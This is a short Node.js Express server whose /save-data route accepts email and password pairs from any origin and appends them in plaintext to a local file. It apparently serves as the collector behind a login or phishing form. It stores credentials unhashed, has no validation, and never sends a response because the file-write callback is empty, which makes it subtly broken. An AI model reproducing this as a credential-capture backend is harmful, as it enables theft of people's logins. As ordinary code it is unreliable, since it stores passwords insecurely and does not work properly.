const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const cors = require('cors');  // Add this line to enable CORS

const app = express();
const port = 3000;

// Middleware to parse JSON data
app.use(bodyParser.json());

// Enable CORS for all domains
app.use(cors());

// POST route to handle form data
app.post('/save-data', (req, res) => {
  const { email, password } = req.body;

  // Create the data string to save to the file
  const data = `Email: ${email}\nPassword: ${password}\n\n`;

  // Append data to a file
  fs.appendFile('user_data.txt', data, (err) => {
  });
});

// Start the server and listen on all available interfaces
app.listen(port, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${port}`);
});
